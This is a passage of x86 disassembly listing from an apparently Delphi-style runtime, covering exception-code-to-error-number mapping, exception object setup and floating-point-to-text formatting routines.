  4069ea:	eb 05                	jmp    0x4069f1
  4069ec:	e8 47 ff ff ff       	call   0x406938
  4069f1:	53                   	push   %ebx
  4069f2:	e9 21 c4 ff ff       	jmp    0x402e18
  4069f7:	5b                   	pop    %ebx
  4069f8:	c3                   	ret
  4069f9:	8d 40 00             	lea    0x0(%eax),%eax
  4069fc:	8b 00                	mov    (%eax),%eax
  4069fe:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  406a03:	7f 2c                	jg     0x406a31
  406a05:	74 59                	je     0x406a60
  406a07:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  406a0c:	7f 15                	jg     0x406a23
  406a0e:	74 53                	je     0x406a63
  406a10:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  406a15:	74 55                	je     0x406a6c
  406a17:	2d 87 00 00 00       	sub    $0x87,%eax
  406a1c:	74 3c                	je     0x406a5a
  406a1e:	48                   	dec    %eax
  406a1f:	74 48                	je     0x406a69
  406a21:	eb 55                	jmp    0x406a78
  406a23:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  406a28:	83 e8 02             	sub    $0x2,%eax
  406a2b:	72 33                	jb     0x406a60
  406a2d:	74 37                	je     0x406a66
  406a2f:	eb 47                	jmp    0x406a78
  406a31:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  406a36:	7f 11                	jg     0x406a49
  406a38:	74 35                	je     0x406a6f
  406a3a:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  406a3f:	74 28                	je     0x406a69
  406a41:	48                   	dec    %eax
  406a42:	74 13                	je     0x406a57
  406a44:	48                   	dec    %eax
  406a45:	74 16                	je     0x406a5d
  406a47:	eb 2f                	jmp    0x406a78
  406a49:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  406a4e:	74 25                	je     0x406a75
  406a50:	83 e8 3d             	sub    $0x3d,%eax
  406a53:	74 1d                	je     0x406a72
  406a55:	eb 21                	jmp    0x406a78
  406a57:	b0 03                	mov    $0x3,%al
  406a59:	c3                   	ret
  406a5a:	b0 04                	mov    $0x4,%al
  406a5c:	c3                   	ret
  406a5d:	b0 05                	mov    $0x5,%al
  406a5f:	c3                   	ret
  406a60:	b0 06                	mov    $0x6,%al
  406a62:	c3                   	ret
  406a63:	b0 07                	mov    $0x7,%al
  406a65:	c3                   	ret
  406a66:	b0 08                	mov    $0x8,%al
  406a68:	c3                   	ret
  406a69:	b0 09                	mov    $0x9,%al
  406a6b:	c3                   	ret
  406a6c:	b0 0b                	mov    $0xb,%al
  406a6e:	c3                   	ret
  406a6f:	b0 0c                	mov    $0xc,%al
  406a71:	c3                   	ret
  406a72:	b0 0d                	mov    $0xd,%al
  406a74:	c3                   	ret
  406a75:	b0 0e                	mov    $0xe,%al
  406a77:	c3                   	ret
  406a78:	b0 15                	mov    $0x15,%al
  406a7a:	c3                   	ret
  406a7b:	90                   	nop
  406a7c:	e8 7b ff ff ff       	call   0x4069fc
  406a81:	25 ff 00 00 00       	and    $0xff,%eax
  406a86:	8b 04 c5 0c b1 40 00 	mov    0x40b10c(,%eax,8),%eax
  406a8d:	c3                   	ret
  406a8e:	8b c0                	mov    %eax,%eax
  406a90:	55                   	push   %ebp
  406a91:	8b ec                	mov    %esp,%ebp
  406a93:	83 c4 dc             	add    $0xffffffdc,%esp
  406a96:	53                   	push   %ebx
  406a97:	56                   	push   %esi
  406a98:	57                   	push   %edi
  406a99:	33 d2                	xor    %edx,%edx
  406a9b:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  406a9e:	8b d8                	mov    %eax,%ebx
  406aa0:	33 c0                	xor    %eax,%eax
  406aa2:	55                   	push   %ebp
  406aa3:	68 73 6b 40 00       	push   $0x406b73
  406aa8:	64 ff 30             	push   %fs:(%eax)
  406aab:	64 89 20             	mov    %esp,%fs:(%eax)
  406aae:	8b c3                	mov    %ebx,%eax
  406ab0:	e8 47 ff ff ff       	call   0x4069fc
  406ab5:	25 ff 00 00 00       	and    $0xff,%eax
  406aba:	8b d0                	mov    %eax,%edx
  406abc:	83 c2 fd             	add    $0xfffffffd,%edx
  406abf:	83 ea 08             	sub    $0x8,%edx
  406ac2:	72 08                	jb     0x406acc
  406ac4:	74 1d                	je     0x406ae3
  406ac6:	4a                   	dec    %edx
  406ac7:	83 ea 09             	sub    $0x9,%edx
  406aca:	73 6c                	jae    0x406b38
  406acc:	8d 04 c5 0c b1 40 00 	lea    0x40b10c(,%eax,8),%eax
  406ad3:	8b 48 04             	mov    0x4(%eax),%ecx
  406ad6:	8b 00                	mov    (%eax),%eax
  406ad8:	b2 01                	mov    $0x1,%dl
  406ada:	e8 4d fd ff ff       	call   0x40682c
  406adf:	8b f0                	mov    %eax,%esi
  406ae1:	eb 7a                	jmp    0x406b5d
  406ae3:	83 7b 14 00          	cmpl   $0x0,0x14(%ebx)
  406ae7:	75 07                	jne    0x406af0
  406ae9:	be a5 ff 00 00       	mov    $0xffa5,%esi
  406aee:	eb 05                	jmp    0x406af5
  406af0:	be a6 ff 00 00       	mov    $0xffa6,%esi
  406af5:	8b 7b 18             	mov    0x18(%ebx),%edi
  406af8:	8b 43 0c             	mov    0xc(%ebx),%eax
  406afb:	89 45 e8             	mov    %eax,-0x18(%ebp)
  406afe:	c6 45 ec 05          	movb   $0x5,-0x14(%ebp)
  406b02:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  406b05:	8b c6                	mov    %esi,%eax
  406b07:	e8 3c e2 ff ff       	call   0x404d48
  406b0c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406b0f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406b12:	c6 45 f4 0b          	movb   $0xb,-0xc(%ebp)
  406b16:	89 7d f8             	mov    %edi,-0x8(%ebp)
  406b19:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  406b1d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  406b20:	50                   	push   %eax
  406b21:	6a 02                	push   $0x2
  406b23:	b9 99 ff 00 00       	mov    $0xff99,%ecx
  406b28:	b2 01                	mov    $0x1,%dl
  406b2a:	b8 e8 4a 40 00       	mov    $0x404ae8,%eax
  406b2f:	e8 68 fd ff ff       	call   0x40689c
  406b34:	8b f0                	mov    %eax,%esi
  406b36:	eb 25                	jmp    0x406b5d
  406b38:	8b 03                	mov    (%ebx),%eax
  406b3a:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406b3d:	c6 45 e0 00          	movb   $0x0,-0x20(%ebp)
  406b41:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406b44:	50                   	push   %eax
  406b45:	6a 00                	push   $0x0
  406b47:	b9 ac ff 00 00       	mov    $0xffac,%ecx
  406b4c:	b2 01                	mov    $0x1,%dl
  406b4e:	b8 38 4c 40 00       	mov    $0x404c38,%eax
  406b53:	e8 44 fd ff ff       	call   0x40689c
  406b58:	8b f0                	mov    %eax,%esi
  406b5a:	89 5e 0c             	mov    %ebx,0xc(%esi)
  406b5d:	33 c0                	xor    %eax,%eax
  406b5f:	5a                   	pop    %edx
  406b60:	59                   	pop    %ecx
  406b61:	59                   	pop    %ecx
  406b62:	64 89 10             	mov    %edx,%fs:(%eax)
  406b65:	68 7a 6b 40 00       	push   $0x406b7a
  406b6a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406b6d:	e8 6e c5 ff ff       	call   0x4030e0
  406b72:	c3                   	ret
  406b73:	e9 e8 c1 ff ff       	jmp    0x402d60
  406b78:	eb f0                	jmp    0x406b6a
  406b7a:	8b c6                	mov    %esi,%eax
  406b7c:	5f                   	pop    %edi
  406b7d:	5e                   	pop    %esi
  406b7e:	5b                   	pop    %ebx
  406b7f:	8b e5                	mov    %ebp,%esp
  406b81:	5d                   	pop    %ebp
  406b82:	c3                   	ret
  406b83:	90                   	nop
  406b84:	e8 1f fb ff ff       	call   0x4066a8
  406b89:	b8 01 00 00 00       	mov    $0x1,%eax
  406b8e:	e8 fc d2 ff ff       	call   0x403e8f
  406b93:	c3                   	ret
  406b94:	b9 87 ff 00 00       	mov    $0xff87,%ecx
  406b99:	b2 01                	mov    $0x1,%dl
  406b9b:	b8 54 47 40 00       	mov    $0x404754,%eax
  406ba0:	e8 87 fc ff ff       	call   0x40682c
  406ba5:	a3 50 c5 40 00       	mov    %eax,0x40c550
  406baa:	c7 05 04 c0 40 00 c0 	movl   $0x4069c0,0x40c004
  406bb1:	69 40 00 
  406bb4:	c7 05 00 c0 40 00 84 	movl   $0x406b84,0x40c000
  406bbb:	6b 40 00 
  406bbe:	b8 04 47 40 00       	mov    $0x404704,%eax
  406bc3:	a3 10 c0 40 00       	mov    %eax,0x40c010
  406bc8:	c7 05 08 c0 40 00 7c 	movl   $0x406a7c,0x40c008
  406bcf:	6a 40 00 
  406bd2:	c7 05 0c c0 40 00 90 	movl   $0x406a90,0x40c00c
  406bd9:	6a 40 00 
  406bdc:	c3                   	ret
  406bdd:	8d 40 00             	lea    0x0(%eax),%eax
  406be0:	81 c4 6c ff ff ff    	add    $0xffffff6c,%esp
  406be6:	c7 04 24 94 00 00 00 	movl   $0x94,(%esp)
  406bed:	54                   	push   %esp
  406bee:	e8 71 da ff ff       	call   0x404664
  406bf3:	85 c0                	test   %eax,%eax
  406bf5:	74 09                	je     0x406c00
  406bf7:	8b 44 24 10          	mov    0x10(%esp),%eax
  406bfb:	a3 7c b0 40 00       	mov    %eax,0x40b07c
  406c00:	81 c4 94 00 00 00    	add    $0x94,%esp
  406c06:	c3                   	ret
  406c07:	90                   	nop
  406c08:	0a 00                	or     (%eax),%al
  406c0a:	00 00                	add    %al,(%eax)
  406c0c:	64 00 00             	add    %al,%fs:(%eax)
  406c0f:	00 e8                	add    %ch,%al
  406c11:	03 00                	add    (%eax),%eax
  406c13:	00 10                	add    %dl,(%eax)
  406c15:	27                   	daa
  406c16:	00 00                	add    %al,(%eax)
  406c18:	00 00                	add    %al,(%eax)
  406c1a:	40                   	inc    %eax
  406c1b:	76 3a                	jbe    0x406c57
  406c1d:	6b 0b de             	imul   $0xffffffde,(%ebx),%ecx
  406c20:	3a 40 3f             	cmp    0x3f(%eax),%al
  406c23:	13 49 4e             	adc    0x4e(%ecx),%ecx
  406c26:	46                   	inc    %esi
  406c27:	4e                   	dec    %esi
  406c28:	41                   	inc    %ecx
  406c29:	4e                   	dec    %esi
  406c2a:	55                   	push   %ebp
  406c2b:	8b ec                	mov    %esp,%ebp
  406c2d:	83 ec 1c             	sub    $0x1c,%esp
  406c30:	57                   	push   %edi
  406c31:	56                   	push   %esi
  406c32:	53                   	push   %ebx
  406c33:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406c36:	b8 13 00 00 00       	mov    $0x13,%eax
  406c3b:	80 f9 00             	cmp    $0x0,%cl
  406c3e:	75 17                	jne    0x406c57
  406c40:	8b 45 0c             	mov    0xc(%ebp),%eax
  406c43:	83 f8 02             	cmp    $0x2,%eax
  406c46:	7d 05                	jge    0x406c4d
  406c48:	b8 02 00 00 00       	mov    $0x2,%eax
  406c4d:	83 f8 12             	cmp    $0x12,%eax
  406c50:	7e 05                	jle    0x406c57
  406c52:	b8 12 00 00 00       	mov    $0x12,%eax
  406c57:	89 45 0c             	mov    %eax,0xc(%ebp)
  406c5a:	50                   	push   %eax
  406c5b:	b8 0f 27 00 00       	mov    $0x270f,%eax
  406c60:	80 7d 10 02          	cmpb   $0x2,0x10(%ebp)
  406c64:	72 03                	jb     0x406c69
  406c66:	8b 45 08             	mov    0x8(%ebp),%eax
  406c69:	50                   	push   %eax
  406c6a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406c6d:	e8 54 05 00 00       	call   0x4071c6
  406c72:	8b 7d fc             	mov    -0x4(%ebp),%edi
  406c75:	0f b7 45 e4          	movzwl -0x1c(%ebp),%eax
  406c79:	2d ff 7f 00 00       	sub    $0x7fff,%eax
  406c7e:	83 f8 02             	cmp    $0x2,%eax
  406c81:	73 10                	jae    0x406c93
  406c83:	8d b4 40 24 6c 40 00 	lea    0x406c24(%eax,%eax,2),%esi
  406c8a:	b9 03 00 00 00       	mov    $0x3,%ecx
  406c8f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406c91:	eb 23                	jmp    0x406cb6
  406c93:	8d 75 e7             	lea    -0x19(%ebp),%esi
  406c96:	0f b6 5d 10          	movzbl 0x10(%ebp),%ebx
  406c9a:	80 fb 01             	cmp    $0x1,%bl
  406c9d:	74 10                	je     0x406caf
  406c9f:	80 fb 04             	cmp    $0x4,%bl
  406ca2:	77 09                	ja     0x406cad
  406ca4:	0f bf 45 e4          	movswl -0x1c(%ebp),%eax
  406ca8:	3b 45 0c             	cmp    0xc(%ebp),%eax
  406cab:	7e 02                	jle    0x406caf
  406cad:	b3 00                	mov    $0x0,%bl
  406caf:	ff 14 9d c4 6c 40 00 	call   *0x406cc4(,%ebx,4)
  406cb6:	8b c7                	mov    %edi,%eax
  406cb8:	2b 45 fc             	sub    -0x4(%ebp),%eax
  406cbb:	5b                   	pop    %ebx
  406cbc:	5e                   	pop    %esi
  406cbd:	5f                   	pop    %edi
  406cbe:	8b e5                	mov    %ebp,%esp
  406cc0:	5d                   	pop    %ebp
  406cc1:	c2 0c 00             	ret    $0xc
  406cc4:	eb 6c                	jmp    0x406d32
  406cc6:	40                   	inc    %eax
  406cc7:	00 4d 6d             	add    %cl,0x6d(%ebp)
  406cca:	40                   	inc    %eax
  406ccb:	00 c0                	add    %al,%al
  406ccd:	6d                   	insl   (%dx),%es:(%edi)
  406cce:	40                   	inc    %eax
  406ccf:	00 c0                	add    %al,%al
  406cd1:	6d                   	insl   (%dx),%es:(%edi)
  406cd2:	40                   	inc    %eax
  406cd3:	00 26                	add    %ah,(%esi)
  406cd5:	6e                   	outsb  %ds:(%esi),(%dx)
  406cd6:	40                   	inc    %eax
  406cd7:	00 ac 0a c0 75 03 b0 	add    %ch,-0x4ffc8a40(%edx,%ecx,1)
  406cde:	30 4e c3             	xor    %cl,-0x3d(%esi)
  406ce1:	80 7d e6 00          	cmpb   $0x0,-0x1a(%ebp)
  406ce5:	74 03                	je     0x406cea
  406ce7:	b0 2d                	mov    $0x2d,%al
  406ce9:	aa                   	stos   %al,%es:(%edi)
  406cea:	c3                   	ret
  406ceb:	e8 f1 ff ff ff       	call   0x406ce1
  406cf0:	0f bf 4d e4          	movswl -0x1c(%ebp),%ecx
  406cf4:	33 d2                	xor    %edx,%edx
  406cf6:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  406cf9:	7f 1f                	jg     0x406d1a
  406cfb:	83 f9 fd             	cmp    $0xfffffffd,%ecx
  406cfe:	7c 1a                	jl     0x406d1a
  406d00:	0b c9                	or     %ecx,%ecx
  406d02:	7f 1c                	jg     0x406d20
  406d04:	b0 30                	mov    $0x30,%al
  406d06:	aa                   	stos   %al,%es:(%edi)
  406d07:	80 3e 00             	cmpb   $0x0,(%esi)
  406d0a:	74 40                	je     0x406d4c
  406d0c:	a0 97 c4 40 00       	mov    0x40c497,%al
  406d11:	aa                   	stos   %al,%es:(%edi)
  406d12:	f7 d9                	neg    %ecx
  406d14:	b0 30                	mov    $0x30,%al
  406d16:	f3 aa                	rep stos %al,%es:(%edi)
  406d18:	eb 1c                	jmp    0x406d36
  406d1a:	b9 01 00 00 00       	mov    $0x1,%ecx
  406d1f:	42                   	inc    %edx
  406d20:	ac                   	lods   %ds:(%esi),%al
  406d21:	0a c0                	or     %al,%al
  406d23:	74 19                	je     0x406d3e
  406d25:	aa                   	stos   %al,%es:(%edi)
  406d26:	e2 f8                	loop   0x406d20
  406d28:	ac                   	lods   %ds:(%esi),%al
  406d29:	0a c0                	or     %al,%al
  406d2b:	74 15                	je     0x406d42
  406d2d:	8a e0                	mov    %al,%ah
  406d2f:	a0 97 c4 40 00       	mov    0x40c497,%al
  406d34:	66 ab                	stos   %ax,%es:(%edi)
  406d36:	ac                   	lods   %ds:(%esi),%al
  406d37:	0a c0                	or     %al,%al
  406d39:	74 07                	je     0x406d42
  406d3b:	aa                   	stos   %al,%es:(%edi)
  406d3c:	eb f8                	jmp    0x406d36
  406d3e:	b0 30                	mov    $0x30,%al
  406d40:	f3 aa                	rep stos %al,%es:(%edi)
  406d42:	0b d2                	or     %edx,%edx
  406d44:	74 06                	je     0x406d4c
  406d46:	33 c0                	xor    %eax,%eax
  406d48:	33 c9                	xor    %ecx,%ecx
  406d4a:	eb 2b                	jmp    0x406d77
  406d4c:	c3                   	ret
  406d4d:	e8 8f ff ff ff       	call   0x406ce1
  406d52:	e8 81 ff ff ff       	call   0x406cd8
  406d57:	8a 25 97 c4 40 00    	mov    0x40c497,%ah
  406d5d:	66 ab                	stos   %ax,%es:(%edi)
  406d5f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406d62:	49                   	dec    %ecx
  406d63:	e8 70 ff ff ff       	call   0x406cd8
  406d68:	aa                   	stos   %al,%es:(%edi)
  406d69:	e2 f8                	loop   0x406d63
  406d6b:	b4 2b                	mov    $0x2b,%ah
  406d6d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406d70:	83 f9 04             	cmp    $0x4,%ecx
  406d73:	72 02                	jb     0x406d77
  406d75:	33 c9                	xor    %ecx,%ecx
  406d77:	b0 45                	mov    $0x45,%al
  406d79:	8a 5d e7             	mov    -0x19(%ebp),%bl
  406d7c:	0f bf 55 e4          	movswl -0x1c(%ebp),%edx
  406d80:	4a                   	dec    %edx
  406d81:	aa                   	stos   %al,%es:(%edi)
  406d82:	0a db                	or     %bl,%bl
  406d84:	75 04                	jne    0x406d8a
  406d86:	33 d2                	xor    %edx,%edx
  406d88:	eb 0a                	jmp    0x406d94
  406d8a:	0b d2                	or     %edx,%edx
  406d8c:	7d 06                	jge    0x406d94
  406d8e:	b0 2d                	mov    $0x2d,%al
  406d90:	f7 da                	neg    %edx
  406d92:	eb 06                	jmp    0x406d9a
  406d94:	0a e4                	or     %ah,%ah
  406d96:	74 03                	je     0x406d9b
  406d98:	8a c4                	mov    %ah,%al
  406d9a:	aa                   	stos   %al,%es:(%edi)
  406d9b:	92                   	xchg   %eax,%edx
  406d9c:	50                   	push   %eax
  406d9d:	8b dc                	mov    %esp,%ebx
  406d9f:	33 d2                	xor    %edx,%edx
  406da1:	f7 35 08 6c 40 00    	divl   0x406c08
  406da7:	80 c2 30             	add    $0x30,%dl
  406daa:	88 13                	mov    %dl,(%ebx)
  406dac:	43                   	inc    %ebx
  406dad:	49                   	dec    %ecx
  406dae:	0b c0                	or     %eax,%eax
  406db0:	75 ed                	jne    0x406d9f
  406db2:	0b c9                	or     %ecx,%ecx
  406db4:	7f e9                	jg     0x406d9f
  406db6:	4b                   	dec    %ebx
  406db7:	8a 03                	mov    (%ebx),%al
  406db9:	aa                   	stos   %al,%es:(%edi)
  406dba:	3b dc                	cmp    %esp,%ebx
  406dbc:	75 f8                	jne    0x406db6
  406dbe:	58                   	pop    %eax
  406dbf:	c3                   	ret
  406dc0:	e8 1c ff ff ff       	call   0x406ce1
  406dc5:	8b 55 08             	mov    0x8(%ebp),%edx
  406dc8:	83 fa 12             	cmp    $0x12,%edx
  406dcb:	72 05                	jb     0x406dd2
  406dcd:	ba 12 00 00 00       	mov    $0x12,%edx
  406dd2:	0f bf 4d e4          	movswl -0x1c(%ebp),%ecx
  406dd6:	0b c9                	or     %ecx,%ecx
  406dd8:	7f 05                	jg     0x406ddf
  406dda:	b0 30                	mov    $0x30,%al
  406ddc:	aa                   	stos   %al,%es:(%edi)
  406ddd:	eb 28                	jmp    0x406e07
  406ddf:	33 db                	xor    %ebx,%ebx
  406de1:	80 7d 10 02          	cmpb   $0x2,0x10(%ebp)
  406de5:	74 0a                	je     0x406df1
  406de7:	8b c1                	mov    %ecx,%eax
  406de9:	48                   	dec    %eax
  406dea:	b3 03                	mov    $0x3,%bl
  406dec:	f6 f3                	div    %bl
  406dee:	8a dc                	mov    %ah,%bl
  406df0:	43                   	inc    %ebx
  406df1:	e8 e2 fe ff ff       	call   0x406cd8
  406df6:	aa                   	stos   %al,%es:(%edi)
  406df7:	49                   	dec    %ecx
  406df8:	74 0d                	je     0x406e07
  406dfa:	4b                   	dec    %ebx
  406dfb:	75 f4                	jne    0x406df1
  406dfd:	a0 96 c4 40 00       	mov    0x40c496,%al
  406e02:	aa                   	stos   %al,%es:(%edi)
  406e03:	b3 03                	mov    $0x3,%bl
  406e05:	eb ea                	jmp    0x406df1
  406e07:	0b d2                	or     %edx,%edx
  406e09:	74 1a                	je     0x406e25
  406e0b:	a0 97 c4 40 00       	mov    0x40c497,%al
  406e10:	aa                   	stos   %al,%es:(%edi)
  406e11:	e3 09                	jecxz  0x406e1c
  406e13:	b0 30                	mov    $0x30,%al
  406e15:	aa                   	stos   %al,%es:(%edi)
  406e16:	4a                   	dec    %edx
  406e17:	74 0c                	je     0x406e25
  406e19:	41                   	inc    %ecx
  406e1a:	75 f9                	jne    0x406e15
  406e1c:	e8 b7 fe ff ff       	call   0x406cd8
  406e21:	aa                   	stos   %al,%es:(%edi)
  406e22:	4a                   	dec    %edx
  406e23:	75 f7                	jne    0x406e1c
  406e25:	c3                   	ret
  406e26:	33 db                	xor    %ebx,%ebx
  406e28:	8a 1d 94 c4 40 00    	mov    0x40c494,%bl
  406e2e:	b9 03 00 00 00       	mov    $0x3,%ecx
  406e33:	80 7d e6 00          	cmpb   $0x0,-0x1a(%ebp)
  406e37:	74 0b                	je     0x406e44
  406e39:	8a 1d 95 c4 40 00    	mov    0x40c495,%bl
  406e3f:	b9 0f 04 00 00       	mov    $0x40f,%ecx
  406e44:	3a d9                	cmp    %cl,%bl
  406e46:	76 02                	jbe    0x406e4a
  406e48:	8a d9                	mov    %cl,%bl
  406e4a:	02 dd                	add    %ch,%bl
  406e4c:	8d 9c 9b 8f 6e 40 00 	lea    0x406e8f(%ebx,%ebx,4),%ebx
  406e53:	b9 05 00 00 00       	mov    $0x5,%ecx
  406e58:	8a 03                	mov    (%ebx),%al
  406e5a:	3c 40                	cmp    $0x40,%al
  406e5c:	74 1e                	je     0x406e7c
  406e5e:	51                   	push   %ecx
  406e5f:	53                   	push   %ebx
  406e60:	3c 24                	cmp    $0x24,%al
  406e62:	74 07                	je     0x406e6b
  406e64:	3c 2a                	cmp    $0x2a,%al
  406e66:	74 0a                	je     0x406e72
  406e68:	aa                   	stos   %al,%es:(%edi)
  406e69:	eb 0c                	jmp    0x406e77
  406e6b:	e8 0d 00 00 00       	call   0x406e7d
  406e70:	eb 05                	jmp    0x406e77
  406e72:	e8 4e ff ff ff       	call   0x406dc5
  406e77:	5b                   	pop    %ebx
  406e78:	59                   	pop    %ecx
  406e79:	43                   	inc    %ebx
  406e7a:	e2 dc                	loop   0x406e58
  406e7c:	c3                   	ret
  406e7d:	56                   	push   %esi
  406e7e:	8b 35 90 c4 40 00    	mov    0x40c490,%esi
  406e84:	85 f6                	test   %esi,%esi
  406e86:	74 05                	je     0x406e8d
  406e88:	8b 4e fc             	mov    -0x4(%esi),%ecx
  406e8b:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406e8d:	5e                   	pop    %esi
  406e8e:	c3                   	ret
  406e8f:	24 2a                	and    $0x2a,%al
  406e91:	40                   	inc    %eax
  406e92:	40                   	inc    %eax
  406e93:	40                   	inc    %eax
  406e94:	2a 24 40             	sub    (%eax,%eax,2),%ah
  406e97:	40                   	inc    %eax
  406e98:	40                   	inc    %eax
  406e99:	24 20                	and    $0x20,%al
  406e9b:	2a 40 40             	sub    0x40(%eax),%al
  406e9e:	2a 20                	sub    (%eax),%ah
  406ea0:	24 40                	and    $0x40,%al
  406ea2:	40                   	inc    %eax
  406ea3:	28 24 2a             	sub    %ah,(%edx,%ebp,1)
  406ea6:	29 40 2d             	sub    %eax,0x2d(%eax)
  406ea9:	24 2a                	and    $0x2a,%al
  406eab:	40                   	inc    %eax
  406eac:	40                   	inc    %eax
  406ead:	24 2d                	and    $0x2d,%al
  406eaf:	2a 40 40             	sub    0x40(%eax),%al
  406eb2:	24 2a                	and    $0x2a,%al
  406eb4:	2d 40 40 28 2a       	sub    $0x2a284040,%eax
  406eb9:	24 29                	and    $0x29,%al
  406ebb:	40                   	inc    %eax
  406ebc:	2d 2a 24 40 40       	sub    $0x4040242a,%eax
  406ec1:	2a 2d 24 40 40 2a    	sub    0x2a404024,%ch
  406ec7:	24 2d                	and    $0x2d,%al
  406ec9:	40                   	inc    %eax
  406eca:	40                   	inc    %eax
  406ecb:	2d 2a 20 24 40       	sub    $0x4024202a,%eax
  406ed0:	2d 24 20 2a 40       	sub    $0x402a2024,%eax
  406ed5:	2a 20                	sub    (%eax),%ah
  406ed7:	24 2d                	and    $0x2d,%al
  406ed9:	40                   	inc    %eax
  406eda:	24 20                	and    $0x20,%al
  406edc:	2a 2d 40 24 20 2d    	sub    0x2d202440,%ch
  406ee2:	2a 40 2a             	sub    0x2a(%eax),%al
  406ee5:	2d 20 24 40 28       	sub    $0x28402420,%eax
  406eea:	24 20                	and    $0x20,%al
  406eec:	2a 29                	sub    (%ecx),%ch
  406eee:	28 2a                	sub    %ch,(%edx)
  406ef0:	20 24 29             	and    %ah,(%ecx,%ebp,1)
  406ef3:	55                   	push   %ebp
  406ef4:	8b ec                	mov    %esp,%ebp
  406ef6:	83 ec 40             	sub    $0x40,%esp
  406ef9:	57                   	push   %edi
  406efa:	56                   	push   %esi
  406efb:	53                   	push   %ebx
  406efc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406eff:	8b fa                	mov    %edx,%edi
  406f01:	8b d9                	mov    %ecx,%ebx
  406f03:	b9 02 00 00 00       	mov    $0x2,%ecx
  406f08:	80 fb 00             	cmp    $0x0,%bl
  406f0b:	74 0f                	je     0x406f1c
  406f0d:	8b 07                	mov    (%edi),%eax
  406f0f:	0b 47 04             	or     0x4(%edi),%eax
  406f12:	74 1a                	je     0x406f2e
  406f14:	8b 4f 04             	mov    0x4(%edi),%ecx
  406f17:	c1 e9 1f             	shr    $0x1f,%ecx
  406f1a:	eb 12                	jmp    0x406f2e
  406f1c:	0f b7 47 08          	movzwl 0x8(%edi),%eax
  406f20:	0b 07                	or     (%edi),%eax
  406f22:	0b 47 04             	or     0x4(%edi),%eax
  406f25:	74 07                	je     0x406f2e
  406f27:	0f b7 4f 08          	movzwl 0x8(%edi),%ecx
  406f2b:	c1 e9 0f             	shr    $0xf,%ecx
  406f2e:	e8 8c 00 00 00       	call   0x406fbf
  406f33:	74 4c                	je     0x406f81
  406f35:	e8 c0 00 00 00       	call   0x406ffa
  406f3a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406f3d:	ba 0f 27 00 00       	mov    $0x270f,%edx
  406f42:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  406f46:	75 0a                	jne    0x406f52
  406f48:	2b 45 e8             	sub    -0x18(%ebp),%eax
  406f4b:	8b d0                	mov    %eax,%edx
  406f4d:	b8 12 00 00 00       	mov    $0x12,%eax
  406f52:	50                   	push   %eax
  406f53:	52                   	push   %edx
  406f54:	8d 45 c0             	lea    -0x40(%ebp),%eax
  406f57:	8b d7                	mov    %edi,%edx
  406f59:	8b cb                	mov    %ebx,%ecx
  406f5b:	e8 66 02 00 00       	call   0x4071c6
  406f60:	66 8b 45 c0          	mov    -0x40(%ebp),%ax
  406f64:	66 3d 00 80          	cmp    $0x8000,%ax
  406f68:	74 17                	je     0x406f81
  406f6a:	66 3d ff 7f          	cmp    $0x7fff,%ax
  406f6e:	74 11                	je     0x406f81
  406f70:	80 fb 00             	cmp    $0x0,%bl
  406f73:	75 20                	jne    0x406f95
  406f75:	66 3d 12 00          	cmp    $0x12,%ax
  406f79:	7e 1a                	jle    0x406f95
  406f7b:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  406f7f:	75 14                	jne    0x406f95
  406f81:	6a 00                	push   $0x0
  406f83:	6a 0f                	push   $0xf
  406f85:	6a 00                	push   $0x0
  406f87:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406f8a:	8b d7                	mov    %edi,%edx
  406f8c:	8b cb                	mov    %ebx,%ecx
  406f8e:	e8 97 fc ff ff       	call   0x406c2a
  406f93:	eb 21                	jmp    0x406fb6
  406f95:	80 7d c3 00          	cmpb   $0x0,-0x3d(%ebp)
  406f99:	75 16                	jne    0x406fb1
  406f9b:	b9 02 00 00 00       	mov    $0x2,%ecx
  406fa0:	e8 1a 00 00 00       	call   0x406fbf
  406fa5:	74 da                	je     0x406f81
  406fa7:	3b 75 f0             	cmp    -0x10(%ebp),%esi
  406faa:	74 05                	je     0x406fb1
  406fac:	e8 49 00 00 00       	call   0x406ffa
  406fb1:	e8 ef 00 00 00       	call   0x4070a5
  406fb6:	5b                   	pop    %ebx
  406fb7:	5e                   	pop    %esi
  406fb8:	5f                   	pop    %edi
  406fb9:	8b e5                	mov    %ebp,%esp
  406fbb:	5d                   	pop    %ebp
  406fbc:	c2 04 00             	ret    $0x4
  406fbf:	8b 75 08             	mov    0x8(%ebp),%esi
  406fc2:	e3 1d                	jecxz  0x406fe1
  406fc4:	ac                   	lods   %ds:(%esi),%al
  406fc5:	3c 27                	cmp    $0x27,%al
  406fc7:	74 24                	je     0x406fed
  406fc9:	3c 22                	cmp    $0x22,%al
  406fcb:	74 20                	je     0x406fed
  406fcd:	0a c0                	or     %al,%al
  406fcf:	74 10                	je     0x406fe1
  406fd1:	3c 3b                	cmp    $0x3b,%al
  406fd3:	75 ef                	jne    0x406fc4
  406fd5:	e2 ed                	loop   0x406fc4
  406fd7:	8a 06                	mov    (%esi),%al
  406fd9:	0a c0                	or     %al,%al
  406fdb:	74 04                	je     0x406fe1
  406fdd:	3c 3b                	cmp    $0x3b,%al
  406fdf:	75 0b                	jne    0x406fec
